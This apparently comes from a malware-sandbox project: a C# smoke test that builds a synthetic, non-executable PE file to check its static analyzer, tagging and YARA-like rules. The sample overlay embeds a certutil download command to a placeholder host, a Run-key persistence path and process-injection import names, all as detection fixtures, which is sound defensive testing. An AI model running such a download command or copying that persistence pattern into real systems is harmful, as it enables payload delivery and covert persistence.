using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.Core.StaticAnalysis;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Verifies cloud-sandbox-style static PE evidence that does not require
/// external tools. Inputs are a synthetic PE file; processing analyzes
/// overlay, certificate-table, URL, and IP clues; the scenario returns
/// pass/fail metadata.
/// </summary>
internal sealed class StaticAnalysisPeEvidenceContractScenario : ISmokeTestScenario
{
    public string ScenarioId => "static.analysis-pe-evidence-contract";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var staticRoot = Path.Combine(context.RuntimeRoot, "static-pe-evidence");
        Directory.CreateDirectory(staticRoot);
        WriteLocalStaticYaraRules(staticRoot);
        var samplePath = Path.Combine(staticRoot, "overlay-signed.exe");
        WriteOverlaySignedPe(samplePath);

        var analyzer = new StaticAnalyzer();
        var result = analyzer.Analyze(samplePath);
        AssertTags(
            result.Tags,
            "pe32_plus",
            "imports_present",
            "import_suspicious_api",
            "import_process_injection_api",
            "import_dynamic_code_api",
            "import_network_api",
            "import_network_library",
            "import_suspicious_api_cluster",
            "import_multi_suspicious_api_cluster",
            "overlay_present",
            "pe_overlay",
            "overlay_contains_certificate_table",
            "overlay_non_certificate_data",
            "overlay_high_entropy",
            "security_directory_present",
            "digital_signature_present",
            "authenticode_signature_present",
            "signature_pkcs_signed_data",
            "exports_present",
            "export_registration_entrypoint",
            "export_service_entrypoint",
            "tls_directory_present",
            "tls_callback_pointer",
            "tls_callbacks",
            "url",
            "ip_address",
            "public_ip_address",
            "email_address",
            "registry_path_string",
            "run_key_path_string",
            "windows_path_string",
            "lolbin_string",
            "packer_hint",
            "packer_string_hint",
            "packer_upx",
            "static.yara.match",
            "static.yara.engine.builtin");
        SmokeAssert.True(
            result.Sections.Any(section =>
                string.Equals(section.Name, ".text", StringComparison.OrdinalIgnoreCase) &&
                section.RawDataOffset == "0x00000200" &&
                section.EntropyLabel.Length > 0 &&
                section.IsExecutable &&
                !section.IsWritable),
            "StaticAnalyzer should expose structured section entropy/flag fields.");
        SmokeAssert.True(
            result.Imports.Any(module =>
                string.Equals(module.ModuleName, "KERNEL32.dll", StringComparison.OrdinalIgnoreCase) &&
                module.NamedApiCount == 3 &&
                module.ApiNames.Contains("WriteProcessMemory", StringComparer.OrdinalIgnoreCase) &&
                module.SuspiciousApiClusters.Contains("process-injection", StringComparer.OrdinalIgnoreCase)),
            "StaticAnalyzer should expose structured import module/API fields.");
        SmokeAssert.True(
            result.ImportApiClusters.Any(cluster =>
                string.Equals(cluster.Name, "process-injection", StringComparison.OrdinalIgnoreCase) &&
                cluster.HitCount == 2 &&
                cluster.ApiNames.Contains("CreateRemoteThread", StringComparer.OrdinalIgnoreCase)),
            "StaticAnalyzer should expose structured suspicious import API clusters.");
        SmokeAssert.True(
            string.Equals(result.ExportModuleName, "SmokeDll.dll", StringComparison.OrdinalIgnoreCase) &&
            result.ExportNames.Contains("DllRegisterServer", StringComparer.OrdinalIgnoreCase) &&
            result.ExportNames.Contains("ServiceMain", StringComparer.OrdinalIgnoreCase),
            "StaticAnalyzer should expose structured export module/name fields.");
        SmokeAssert.True(
            result.Tls is { DirectoryPresent: true } &&
            string.Equals(result.Tls.CallbackTableVa, "0x1400010E0", StringComparison.OrdinalIgnoreCase) &&
            result.Tls.Callbacks.Any(callback => string.Equals(callback.VirtualAddress, "0x140001010", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should expose structured TLS callback fields.");
        SmokeAssert.True(
            result.Overlay is { Present: true, ContainsCertificateTable: true, NonCertificateSize: > 0, NonCertificateEntropy: not null },
            "StaticAnalyzer should expose structured overlay offsets, sizes, and entropy.");
        SmokeAssert.True(
            result.NetworkIndicators.Any(indicator => indicator.Kind == "url" && indicator.Value.StartsWith("https://overlay.example.invalid/", StringComparison.OrdinalIgnoreCase)) &&
            result.NetworkIndicators.Any(indicator => indicator.Kind == "ipv4" && indicator.Classification == "public") &&
            result.NetworkIndicators.Any(indicator => indicator.Kind == "email" && indicator.Value == "ops@example.invalid"),
            "StaticAnalyzer should expose structured URL/IP/email indicators.");
        SmokeAssert.True(
            result.PathIndicators.Any(indicator => indicator.Kind == "registry" && indicator.Tags.Contains("run_key_path_string", StringComparer.OrdinalIgnoreCase)) &&
            result.PathIndicators.Any(indicator => indicator.Kind == "filesystem" && indicator.Tags.Contains("executable_path_string", StringComparer.OrdinalIgnoreCase)),
            "StaticAnalyzer should expose structured registry and filesystem path indicators.");
        SmokeAssert.True(
            result.CommandIndicators.Any(indicator => indicator.Category == "lolbin" && string.Equals(indicator.Tool, "certutil", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should expose structured LOLBIN command indicators.");
        SmokeAssert.True(
            result.InterestingStrings.Any(value => value.StartsWith("overlay:", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should emit overlay-prefixed evidence.");
        SmokeAssert.True(
            result.InterestingStrings.Any(value => value.StartsWith("signature:certificate-table", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should emit certificate-table evidence.");
        SmokeAssert.True(
            result.InterestingStrings.Any(value => value.StartsWith("import-summary:modules=2,namedApis=4,ordinals=0", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should emit aggregate import-table summary evidence.");
        SmokeAssert.True(
            result.InterestingStrings.Any(value => value.StartsWith("import-module:KERNEL32.dll,namedApis=3,ordinals=0", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should emit per-module import count evidence.");
        SmokeAssert.True(
            result.InterestingStrings.Any(value => value.StartsWith("import-api-cluster:process-injection,hits=2", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should emit suspicious import API cluster evidence.");
        SmokeAssert.True(
            result.InterestingStrings.Any(value => value.StartsWith("import-api-cluster:network,hits=1", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should emit network import API cluster evidence.");
        SmokeAssert.True(
            result.Urls.Any(value => value.StartsWith("https://overlay.example.invalid/", StringComparison.OrdinalIgnoreCase)),
            "StaticAnalyzer should extract URL strings from overlay bytes.");

        var projectedEvents = analyzer.AnalyzeToEvents(samplePath);
        AssertProjectedStaticEvents(projectedEvents);
        AssertProjectedStaticRuleConsumption(context, projectedEvents);

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = "Static analyzer emits structured PE, overlay, signature, URL/IP/email, path, command, packer, and YARA-like event evidence."
        });
    }

    /// <summary>
    /// Asserts that static-analysis event projection exposes rule-consumable
    /// event rows for the major PE, string, packer, and YARA-like signals.
    /// </summary>
    private static void AssertProjectedStaticEvents(IReadOnlyList<SandboxEvent> events)
    {
        var summary = RequireEvent(events, "static.analysis.completed");
        RequireData(summary, "zhMessage");
        RequireData(summary, "zhHint");

        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.pe.section", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "name", ".text") &&
                evt.Data.ContainsKey("entropy")),
            "StaticAnalyzer should project section entropy events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.pe.import.module", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "moduleName", "KERNEL32.dll") &&
                DataContains(evt, "apiNames", "WriteProcessMemory")),
            "StaticAnalyzer should project PE import module/API events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.pe.import.cluster", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "cluster", "process-injection") &&
                DataContains(evt, "tags", "import_process_injection_api")),
            "StaticAnalyzer should project suspicious import cluster events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.pe.export", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "exportName", "DllRegisterServer") &&
                DataContains(evt, "tags", "export_registration_entrypoint")),
            "StaticAnalyzer should project export-name events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.pe.tls.callback", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "virtualAddress", "0x140001010")),
            "StaticAnalyzer should project TLS callback events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.pe.overlay", StringComparison.OrdinalIgnoreCase) &&
                DataContains(evt, "tags", "overlay_high_entropy")),
            "StaticAnalyzer should project PE overlay events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.string.indicator", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "kind", "url") &&
                DataContains(evt, "value", "overlay.example.invalid")),
            "StaticAnalyzer should project suspicious string/network indicator events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.string.command", StringComparison.OrdinalIgnoreCase) &&
                DataEquals(evt, "category", "lolbin") &&
                DataEquals(evt, "tool", "certutil")),
            "StaticAnalyzer should project command/LOLBIN string events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.packer.hint", StringComparison.OrdinalIgnoreCase) &&
                DataContains(evt, "tags", "packer_upx")),
            "StaticAnalyzer should project packer hint events.");
        SmokeAssert.True(
            events.Any(evt =>
                string.Equals(evt.EventType, "static.yara.match", StringComparison.OrdinalIgnoreCase) &&
                evt.Data.ContainsKey("ruleName") &&
                DataEquals(evt, "engine", "builtin") &&
                evt.Data.ContainsKey("zhHint")),
            "StaticAnalyzer should project lightweight YARA-like rule match events.");
    }

    /// <summary>
    /// Asserts that behavior rules consume granular static.* events rather than
    /// depending only on the legacy static.analysis.completed summary row.
    /// </summary>
    private static void AssertProjectedStaticRuleConsumption(
        SmokeTestContext context,
        IReadOnlyList<SandboxEvent> events)
    {
        var granularEvents = events
            .Where(evt => !string.Equals(evt.EventType, "static.analysis.completed", StringComparison.OrdinalIgnoreCase))
            .ToList();
        SmokeAssert.True(granularEvents.Count > 0, "Static event projection should include granular static.* rows.");

        var rules = RuleEngine.LoadRuleSet(Path.Combine(context.RulesDirectory, "behavior-rules.json"));
        var findings = new RuleEngine(rules).Classify(granularEvents);
        var findingIds = findings.Select(finding => finding.RuleId).ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var expectedRuleId in new[]
        {
            "static-import-process-injection",
            "static-import-network-api",
            "static-pe-tls-callbacks",
            "static-export-registration-entrypoint",
            "static-embedded-url",
            "static-ip-address",
            "static-registry-path-string",
            "static-script-command-string",
            "static-yara-match-observed"
        })
        {
            SmokeAssert.True(
                findingIds.Contains(expectedRuleId),
                $"Granular static.* evidence should match behavior rule '{expectedRuleId}' without the summary event.");
        }
    }

    /// <summary>
    /// Returns the first event of a requested type.
    /// </summary>
    private static SandboxEvent RequireEvent(IEnumerable<SandboxEvent> events, string eventType)
    {
        var evt = events.FirstOrDefault(candidate => string.Equals(candidate.EventType, eventType, StringComparison.OrdinalIgnoreCase));
        SmokeAssert.True(evt is not null, $"Expected event '{eventType}'.");
        return evt!;
    }

    /// <summary>
    /// Requires that an event data key exists.
    /// </summary>
    private static void RequireData(SandboxEvent evt, string key)
    {
        SmokeAssert.True(evt.Data.ContainsKey(key), $"{evt.EventType} should contain data.{key}.");
    }

    /// <summary>
    /// Tests event data equality.
    /// </summary>
    private static bool DataEquals(SandboxEvent evt, string key, string expected)
    {
        return evt.Data.TryGetValue(key, out var actual) &&
            string.Equals(actual, expected, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Tests whether an event data value contains one fragment.
    /// </summary>
    private static bool DataContains(SandboxEvent evt, string key, string expected)
    {
        return evt.Data.TryGetValue(key, out var actual) &&
            actual.Contains(expected, StringComparison.OrdinalIgnoreCase);
    }

    /// <summary>
    /// Asserts that all expected tags are present.
    /// Inputs are analyzer tags and expected tag names; processing uses
    /// case-insensitive membership, and the method returns no value on success.
    /// </summary>
    private static void AssertTags(IEnumerable<string> tags, params string[] expectedTags)
    {
        var tagSet = tags.ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var tag in expectedTags)
        {
            SmokeAssert.True(tagSet.Contains(tag), $"StaticAnalyzer should emit tag '{tag}'.");
        }
    }

    /// <summary>
    /// Writes a local lightweight YARA-like rule file under the synthetic
    /// fixture root so event projection has deterministic rule-hit coverage
    /// even when tests run outside the repository root.
    /// </summary>
    private static void WriteLocalStaticYaraRules(string root)
    {
        var rulesDirectory = Path.Combine(root, "rules");
        Directory.CreateDirectory(rulesDirectory);
        File.WriteAllText(
            Path.Combine(rulesDirectory, "static-notes.yar"),
            """
            rule KSwordSandbox_Smoke_Static_EventProjection
            {
                meta:
                    description = "Smoke coverage for built-in static YARA-like match events"
                    scope = "smoke"
                    mitre = "T1105"
                strings:
                    $url = "overlay.example.invalid" ascii nocase
                    $api = "WriteProcessMemory" ascii
                condition:
                    any of them
            }
            """);
    }

    /// <summary>
    /// Writes a tiny PE32+ file with one mapped section, a non-certificate
    /// overlay, and a PE security directory pointing at a synthetic
    /// WIN_CERTIFICATE table. The file is not executable and is used only for
    /// parser contract coverage.
    /// </summary>
    private static void WriteOverlaySignedPe(string path)
    {
        var buffer = new byte[0x900];
        WriteUInt16(buffer, 0x00, 0x5a4d);
        WriteUInt32(buffer, 0x3c, 0x80);
        WriteUInt32(buffer, 0x80, 0x00004550);
        WriteUInt16(buffer, 0x84, 0x8664);
        WriteUInt16(buffer, 0x86, 1);
        WriteUInt16(buffer, 0x94, 0xf0);

        var optionalHeaderOffset = 0x98;
        WriteUInt16(buffer, optionalHeaderOffset, 0x20b);
        WriteUInt32(buffer, optionalHeaderOffset + 16, 0x1000);
        WriteUInt64(buffer, optionalHeaderOffset + 24, 0x140000000);
        WriteUInt16(buffer, optionalHeaderOffset + 68, 3);
        WriteUInt32(buffer, optionalHeaderOffset + 108, 16);

        var dataDirectoryOffset = optionalHeaderOffset + 112;
        WriteUInt32(buffer, dataDirectoryOffset, 0x1020);
        WriteUInt32(buffer, dataDirectoryOffset + 4, 0x80);
        WriteUInt32(buffer, dataDirectoryOffset + 1 * 8, 0x1100);
        WriteUInt32(buffer, dataDirectoryOffset + 1 * 8 + 4, 0x3c);
        WriteUInt32(buffer, dataDirectoryOffset + 4 * 8, 0x500);
        WriteUInt32(buffer, dataDirectoryOffset + 4 * 8 + 4, 0x100);
        WriteUInt32(buffer, dataDirectoryOffset + 9 * 8, 0x10b0);
        WriteUInt32(buffer, dataDirectoryOffset + 9 * 8 + 4, 0x28);

        var sectionOffset = optionalHeaderOffset + 0xf0;
        var name = ".text"u8;
        name.CopyTo(buffer.AsSpan(sectionOffset, name.Length));
        WriteUInt32(buffer, sectionOffset + 8, 0x1000);
        WriteUInt32(buffer, sectionOffset + 12, 0x1000);
        WriteUInt32(buffer, sectionOffset + 16, 0x200);
        WriteUInt32(buffer, sectionOffset + 20, 0x200);
        WriteUInt32(buffer, sectionOffset + 36, 0x60000020);

        for (var index = 0x200; index < 0x400; index++)
        {
            buffer[index] = 0x90;
        }

        WriteSyntheticExportTable(buffer);
        WriteSyntheticTlsDirectory(buffer);
        WriteSyntheticImportTable(buffer);

        var overlayText = "https://overlay.example.invalid/payload 9.9.9.9 ops@example.invalid HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\KswordSmoke certutil.exe -urlcache -split -f http://example.invalid/a C:\\Users\\Public\\AppData\\Local\\Temp\\payload.exe UPX!";
        var overlayBytes = System.Text.Encoding.ASCII.GetBytes(overlayText);
        overlayBytes.CopyTo(buffer.AsSpan(0x410, overlayBytes.Length));

        WriteUInt32(buffer, 0x500, 0x100);
        WriteUInt16(buffer, 0x504, 0x0200);
        WriteUInt16(buffer, 0x506, 0x0002);
        FillDeterministicBytes(buffer, 0x508, 0x600, 0x13579bdf);
        FillDeterministicBytes(buffer, 0x600, buffer.Length, 0x2468ace0);

        File.WriteAllBytes(path, buffer);
    }

    /// <summary>
    /// Writes a bounded export directory with registration/service-like names.
    /// </summary>
    private static void WriteSyntheticExportTable(byte[] buffer)
    {
        WriteUInt32(buffer, 0x220 + 12, 0x1068);
        WriteUInt32(buffer, 0x220 + 16, 1);
        WriteUInt32(buffer, 0x220 + 20, 2);
        WriteUInt32(buffer, 0x220 + 24, 2);
        WriteUInt32(buffer, 0x220 + 28, 0x1050);
        WriteUInt32(buffer, 0x220 + 32, 0x1058);
        WriteUInt32(buffer, 0x220 + 36, 0x1060);

        WriteUInt32(buffer, 0x250, 0x1000);
        WriteUInt32(buffer, 0x254, 0x1010);
        WriteUInt32(buffer, 0x258, 0x1078);
        WriteUInt32(buffer, 0x25c, 0x1090);
        WriteUInt16(buffer, 0x260, 0);
        WriteUInt16(buffer, 0x262, 1);
        WriteAsciiString(buffer, 0x268, "SmokeDll.dll");
        WriteAsciiString(buffer, 0x278, "DllRegisterServer");
        WriteAsciiString(buffer, 0x290, "ServiceMain");
    }

    /// <summary>
    /// Writes a PE32+ TLS directory with one callback VA and a null terminator.
    /// </summary>
    private static void WriteSyntheticTlsDirectory(byte[] buffer)
    {
        WriteUInt64(buffer, 0x2b0 + 24, 0x1400010e0);
        WriteUInt64(buffer, 0x2e0, 0x140001010);
        WriteUInt64(buffer, 0x2e8, 0);
    }

    /// <summary>
    /// Writes a bounded import directory into the synthetic PE section.
    /// </summary>
    private static void WriteSyntheticImportTable(byte[] buffer)
    {
        buffer.AsSpan(0x300, 0x100).Clear();

        WriteUInt32(buffer, 0x300, 0x1160);
        WriteUInt32(buffer, 0x300 + 12, 0x1140);
        WriteUInt32(buffer, 0x300 + 16, 0x1160);
        WriteUInt32(buffer, 0x314, 0x1180);
        WriteUInt32(buffer, 0x314 + 12, 0x114d);
        WriteUInt32(buffer, 0x314 + 16, 0x1180);

        WriteAsciiString(buffer, 0x340, "KERNEL32.dll");
        WriteAsciiString(buffer, 0x34d, "WININET.dll");

        WriteUInt64(buffer, 0x360, 0x11a0);
        WriteUInt64(buffer, 0x368, 0x11b0);
        WriteUInt64(buffer, 0x370, 0x11c8);
        WriteUInt64(buffer, 0x378, 0);
        WriteUInt64(buffer, 0x380, 0x11e0);
        WriteUInt64(buffer, 0x388, 0);

        WriteImportByName(buffer, 0x3a0, "VirtualAlloc");
        WriteImportByName(buffer, 0x3b0, "WriteProcessMemory");
        WriteImportByName(buffer, 0x3c8, "CreateRemoteThread");
        WriteImportByName(buffer, 0x3e0, "InternetOpenA");
    }

    /// <summary>
    /// Writes an IMAGE_IMPORT_BY_NAME entry with a zero hint.
    /// </summary>
    private static void WriteImportByName(byte[] buffer, int offset, string name)
    {
        WriteUInt16(buffer, offset, 0);
        WriteAsciiString(buffer, offset + 2, name);
    }

    /// <summary>
    /// Writes a null-terminated ASCII string into a byte buffer.
    /// </summary>
    private static void WriteAsciiString(byte[] buffer, int offset, string value)
    {
        var bytes = System.Text.Encoding.ASCII.GetBytes(value);
        bytes.CopyTo(buffer.AsSpan(offset, bytes.Length));
        buffer[offset + bytes.Length] = 0;
    }

    /// <summary>
    /// Fills a byte range with deterministic pseudo-random bytes.
    /// </summary>
    private static void FillDeterministicBytes(byte[] buffer, int start, int end, uint seed)
    {
        var state = seed;
        for (var index = start; index < end; index++)
        {
            state = unchecked(state * 1664525 + 1013904223);
            buffer[index] = (byte)(state >> 24);
        }
    }

    /// <summary>
    /// Writes a little-endian UInt16 into a byte buffer.
    /// </summary>
    private static void WriteUInt16(byte[] buffer, int offset, ushort value)
    {
        BitConverter.GetBytes(value).CopyTo(buffer, offset);
    }

    /// <summary>
    /// Writes a little-endian UInt32 into a byte buffer.
    /// </summary>
    private static void WriteUInt32(byte[] buffer, int offset, uint value)
    {
        BitConverter.GetBytes(value).CopyTo(buffer, offset);
    }

    /// <summary>
    /// Writes a little-endian UInt64 into a byte buffer.
    /// </summary>
    private static void WriteUInt64(byte[] buffer, int offset, ulong value)
    {
        BitConverter.GetBytes(value).CopyTo(buffer, offset);
    }
}
